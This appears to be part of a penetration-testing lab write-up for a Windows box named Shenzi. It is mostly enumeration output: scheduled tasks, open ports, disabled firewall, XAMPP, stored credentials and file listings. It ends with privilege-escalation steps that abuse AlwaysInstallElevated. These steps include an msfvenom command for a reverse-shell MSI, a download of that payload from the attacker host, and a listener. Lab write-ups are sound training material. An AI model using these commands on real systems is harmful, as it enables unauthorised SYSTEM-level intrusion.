--------------------------------------------------------------------------------
Task: \Microsoft\Windows\AppxDeploymentClient\Pre-staged app cleanup
RunAs: SYSTEM
Why: Hidden task; LOLBIN launcher in action
Action: %windir%\system32\rundll32.exe %windir%\system32\AppxDeploymentClient.dll,AppxPreStageCleanupRunTask
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Autochk\Proxy
RunAs: SYSTEM
Why: LOLBIN launcher in action
Action: %windir%\system32\rundll32.exe /d acproxy.dll,PerformAutochkOperations
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\BrokerInfrastructure\BgTaskRegistrationMaintenanceTask
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Chkdsk\SyspartRepair
RunAs: SYSTEM
Why: Hidden task
Action: %windir%\system32\bcdboot.exe %windir% /sysrepair
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\CloudExperienceHost\CreateObjectTask
RunAs: SYSTEM
Why: Hidden task
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Customer Experience Improvement Program\UsbCeip
RunAs: SYSTEM
Why: Hidden task
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Data Integrity Scan\Data Integrity Check And Scan
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Data Integrity Scan\Data Integrity Scan for Crash Recovery
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges; Hidden task
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Defrag\ScheduledDefrag
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action: %windir%\system32\defrag.exe -c -h -o -$
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Diagnosis\RecommendedTroubleshootingScanner
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Diagnosis\Scheduled
RunLevel: Highest
Why: Runs with highest privileges; Hidden task
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\DirectX\DirectXDatabaseUpdater
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges; Hidden task
Action: %windir%\system32\directxdatabaseupdater.exe
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\DirectX\DXGIAdapterCache
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges; Hidden task
Action: %windir%\system32\dxgiadaptercache.exe
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\DiskCleanup\SilentCleanup
RunLevel: Highest
Why: Runs with highest privileges
Action: %windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticDataCollector
RunAs: SYSTEM
Why: Hidden task; LOLBIN launcher in action
Action: %windir%\system32\rundll32.exe dfdts.dll,DfdGetDefaultPolicyAndSMART
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\DiskDiagnostic\Microsoft-Windows-DiskDiagnosticResolver
RunLevel: Highest
Why: Runs with highest privileges; Hidden task
Action: %windir%\system32\DFDWiz.exe
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\DiskFootprint\Diagnostics
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action: %windir%\system32\disksnapshot.exe -z
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\DiskFootprint\StorageSense
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Feedback\Siuf\DmClient
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action: %windir%\system32\dmclient.exe
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Feedback\Siuf\DmClientOnScenarioDownload
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action: %windir%\system32\dmclient.exe utcwnf
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\File Classification Infrastructure\Property Definition Sync
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Input\LocalUserSyncDataAvailable
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Input\MouseSyncDataAvailable
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Input\PenSyncDataAvailable
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Input\TouchpadSyncDataAvailable
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Maintenance\WinSAT
RunLevel: Highest
Why: Runs with highest privileges
Action:
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Management\Provisioning\Cellular
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges; Hidden task
Action: %windir%\system32\ProvTool.exe /turn 7 /source CellStateChangeTask
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Management\Provisioning\Logon
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action: %windir%\system32\ProvTool.exe /turn 5 /source LogonIdleTask
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Management\Provisioning\Retry
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action: %windir%\system32\ProvTool.exe /turn 5 /source ProvRetryTask
--------------------------------------------------------------------------------
Task: \Microsoft\Windows\Management\Provisioning\RunOnReboot
RunAs: SYSTEM
RunLevel: Highest
Why: Runs with highest privileges
Action: %windir%\system32\ProvTool.exe /turn 5 /source ContinueSessionTask

[+] Scheduled task action paths with weak ACL (privesc candidates)
No scheduled task action paths with weak ACL patterns found.


```

10. Network

```
[+] Network identity + routing (summary)
InterfaceAlias IPv4Address      IPv4DefaultGateway                                                 DNSServer
-------------- -----------      ------------------                                                 ---------
Ethernet0      {192.168.148.55} {MSFT_NetRoute (InstanceID = ":8:8:8:9:55;;55;C?8;@B8;?B8???55;")} {MSFT_DNSClientServerAddress (Name = "11", CreationClassName = "", SystemCreationClassName = "", SystemName = "23"), MSFT_DNSClientServerAddress (Name = "11", CreationClassName = "", SystemCreationClassName = "", SystemName = "2")}

[+] Listening TCP ports (first 80)
LocalAddress   LocalPort OwningProcess
------------   --------- -------------
0.0.0.0               21          7340
::                    21          7340
::                    80          7324
0.0.0.0               80          7324
::                   135           872
0.0.0.0              135           872
192.168.148.55       139             4
0.0.0.0              443          7324
::                   443          7324
::                   445             4
::                  3306          7332
0.0.0.0             5040          5488
::                  7680          5972
127.0.0.1          14147          7340
::1                14147          7340
0.0.0.0            49664           652
::                 49664           652
0.0.0.0            49665           500
::                 49665           500
0.0.0.0            49666           988
::                 49666           988
::                 49667          1332
0.0.0.0            49667          1332
::                 49668           632
0.0.0.0            49668           632
::                 49669          2272
0.0.0.0            49669          2272

[+] Firewall profiles and status
Name    Enabled DefaultInboundAction DefaultOutboundAction
----    ------- -------------------- ---------------------
Domain    False                Block                 Block
Private   False                Block                 Block
Public    False                Block                 Block

```

11. Software

```
[+] Installed non-Microsoft software (triage, first 80)
DisplayName     : VMware Tools
DisplayVersion  : 10.3.10.12406962
Publisher       : VMware, Inc.
InstallDate     : 20200527
InstallLocation : C:\Program Files\VMware\VMware Tools\
DisplayName     : Windows PC Health Check
DisplayVersion  : 3.2.2110.14001
Publisher       : Microsoft Corporation
InstallDate     : 20211203
InstallLocation :
DisplayName     : XAMPP
DisplayVersion  : 7.4.6-0
Publisher       : Bitnami
InstallDate     : 20200528
InstallLocation : C:\xampp

[+] Interesting software keywords (quick hits)
DisplayName DisplayVersion Publisher
----------- -------------- ---------
XAMPP       7.4.6-0        Bitnami

```

12. Shares & Drivers

```
[+] SMB shares (non-default)
Name   Path      Description
----   ----      -----------
IPC$             Remote IPC
Shenzi C:\Shenzi

[+] Third-party drivers (non-Microsoft, running)
Name        : BasicDisplay
DisplayName : BasicDisplay
StartMode   : System
State       : Running
PathName    : C:\WINDOWS\system32\DriverStore\FileRepository\basicdisplay.inf_amd64_65ab9a260dbf7467\BasicDisplay.sys
Name        : BasicRender
DisplayName : BasicRender
StartMode   : System
State       : Running
PathName    : C:\WINDOWS\system32\DriverStore\FileRepository\basicrender.inf_amd64_df49c4daa6251397\BasicRender.sys
Name        : CompositeBus
DisplayName : Composite Bus Enumerator Driver
StartMode   : Manual
State       : Running
PathName    : C:\WINDOWS\system32\DriverStore\FileRepository\compositebus.inf_amd64_7500cffa210c6946\CompositeBus.sys
Name        : swenum
DisplayName : Software Bus Driver
StartMode   : Manual
State       : Running
PathName    : C:\WINDOWS\system32\DriverStore\FileRepository\swenum.inf_amd64_16a14542b63c02af\swenum.sys
Name        : umbus
DisplayName : UMBus Enumerator Driver
StartMode   : Manual
State       : Running
PathName    : C:\WINDOWS\system32\DriverStore\FileRepository\umbus.inf_amd64_b78a9c5b6fd62c27\umbus.sys
Name        : UrsChipidea
DisplayName : Chipidea USB Role-Switch Driver
StartMode   : Manual
State       : Running
PathName    : C:\WINDOWS\system32\DriverStore\FileRepository\urschipidea.inf_amd64_78ad1c14e33df968\urschipidea.sys

```

13. Loot Files & Credentials

```
[+] cmdkey /list
$ cmdkey /list
Currently stored credentials:
    Target: MicrosoftAccount:target=SSO_POP_Device
    Type: Generic
    User: 02exarfminmqhesu
    Saved for this logon only
    Target: LegacyGeneric:target=XboxLive
    Type: Generic
    Saved for this logon only
    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02exarfminmqhesu
    Local machine persistence

[+] Directory listing: C:\\ (top level)
Mode   LastWriteTime         Length    Name
----   -------------         ------    ----
d--hs- 8/6/2020 6:11:49 AM             $Recycle.Bin
d--h-- 12/3/2021 8:37:25 AM            $WinREAgent
d--hsl 5/27/2020 7:42:56 PM            Documents and Settings
d----- 12/7/2019 1:14:52 AM            PerfLogs
d-r--- 12/3/2021 8:33:38 AM            Program Files
d-r--- 12/3/2021 8:04:32 AM            Program Files (x86)
d--h-- 12/3/2021 8:23:02 AM            ProgramData
d--hs- 12/3/2021 8:11:20 AM            Recovery
d----- 5/28/2020 8:45:09 AM            Shenzi
d--hs- 5/27/2020 7:45:12 PM            System Volume Information
d-r--- 12/3/2021 8:12:03 AM            Users
d----- 4/12/2022 11:06:30 AM           Windows
d----- 5/28/2020 8:58:48 AM            xampp
-a-hs- 8/2/2024 5:04:55 AM   8192      DumpStack.log.tmp
-a---- 2/17/2026 9:13:21 AM  2696      output.txt
-a-hs- 8/2/2024 5:04:55 AM   738197504 pagefile.sys
-a-hs- 8/2/2024 5:04:55 AM   268435456 swapfile.sys

[+] Directory listing: C:\\Users (top level)
Mode   LastWriteTime         Length Name
----   -------------         ------ ----
d----- 12/3/2021 8:30:43 AM         Administrator
d--hsl 12/7/2019 1:30:39 AM         All Users
d-rh-- 12/3/2021 8:19:43 AM         Default
d--hsl 12/7/2019 1:30:39 AM         Default User
d-r--- 12/3/2021 8:08:45 AM         Public
d----- 4/12/2022 10:37:02 AM        shenzi
-a-hs- 12/7/2019 1:12:42 AM  174    desktop.ini

[+] Directory listing: current user profile (top level)
Mode   LastWriteTime          Length  Name
----   -------------          ------  ----
d-r--- 12/3/2021 8:20:49 AM           3D Objects
d--h-- 12/3/2021 8:12:39 AM           AppData
d--hsl 12/3/2021 8:12:04 AM           Application Data
d-r--- 12/3/2021 8:20:49 AM           Contacts
d--hsl 12/3/2021 8:12:04 AM           Cookies
d-r--- 4/12/2022 10:48:17 AM          Desktop
d-r--- 2/17/2026 9:40:24 AM           Documents
d-r--- 4/12/2022 10:37:42 AM          Downloads
d-r--- 12/3/2021 8:20:49 AM           Favorites
d-r--- 12/3/2021 8:20:49 AM           Links
d--hsl 12/3/2021 8:12:04 AM           Local Settings
d-r--- 12/3/2021 8:20:49 AM           Music
d--hsl 12/3/2021 8:12:04 AM           My Documents
d--hsl 12/3/2021 8:12:04 AM           NetHood
d-r--- 10/26/2020 11:21:45 AM         OneDrive
d-r--- 12/3/2021 8:20:49 AM           Pictures
d--hsl 12/3/2021 8:12:04 AM           PrintHood
d--hsl 12/3/2021 8:12:04 AM           Recent
d-r--- 12/3/2021 8:20:49 AM           Saved Games
d-r--- 12/3/2021 8:20:49 AM           Searches
d--hsl 12/3/2021 8:12:04 AM           SendTo
d--hsl 12/3/2021 8:12:04 AM           Start Menu
d--hsl 12/3/2021 8:12:04 AM           Templates
d-r--- 12/3/2021 8:20:49 AM           Videos
-a-h-- 8/2/2024 5:05:29 AM    1310720 NTUSER.DAT
-a-hs- 12/3/2021 8:12:04 AM   270336  ntuser.dat.LOG1
-a-hs- 12/3/2021 8:12:04 AM   355328  ntuser.dat.LOG2
-a-hs- 12/3/2021 8:12:04 AM   65536   NTUSER.DAT{8d8588b9-5453-11ec-b7d4-0050568ad7c2}.TM.blf
-a-hs- 12/3/2021 8:12:04 AM   524288  NTUSER.DAT{8d8588b9-5453-11ec-b7d4-0050568ad7c2}.TMContainer00000000000000000001.regtrans-ms
-a-hs- 12/3/2021 8:12:04 AM   524288  NTUSER.DAT{8d8588b9-5453-11ec-b7d4-0050568ad7c2}.TMContainer00000000000000000002.regtrans-ms
---hs- 12/3/2021 8:20:07 AM   20      ntuser.ini

[+] Unattended install / sysprep credential files
(no output)

[+] Sensitive file name hits in common user paths
(no output)

[+] PowerShell history (all users, full content)
No PSReadLine history files found.

[+] User directory interesting files (*.txt, *.ps1, *.ini, *.xml, *.config, *.kdbx, *.rdp)
FullName                                                LastWriteTime        Length
--------                                                -------------        ------
C:\Users\shenzi\Desktop\local.txt                       2/17/2026 9:13:21 AM     34
C:\Users\shenzi\Documents\pg_privesc.ps1                2/17/2026 9:40:16 AM  25174
C:\Users\shenzi\Documents\privesc_2026-02-17_092027.txt 2/17/2026 9:20:40 AM 128764
C:\Users\shenzi\Documents\privesc_2026-02-17_092937.txt 2/17/2026 9:29:42 AM  97814
C:\Users\shenzi\Documents\privesc_2026-02-17_094024.txt 2/17/2026 9:40:30 AM  82242

[+] Unusual writable paths (potential current-user write access)
Path      Reason
----      ------
C:\Shenzi Non-standard path
C:\xampp  Non-standard path

```

5. Automated Enumeration

```

```

5. Possible PE Paths

```
����������͹ Checking AlwaysInstallElevated
�  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!

```

**Privilege Escalation**

1. PE Steps
- Since the AlwaysInstalledElevated was set to 1 (enabled), decided to create a malicious MSI using msfvenom.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.215 LPORT=445 -f msi -o shell.msi
```

- Transfered malicious .msi to victim machine. 

```
iwr -uri http://192.168.45.215/shell.msi -Outfile shell.msi
```

- Setup reverse shell and ran malicious msi. 

```
penelope -p 445 
.\shell.msi
```

- Caught shell and viewed proof.txt.

![[Pasted image 20260217110547.png]]

2. Notes

```

```
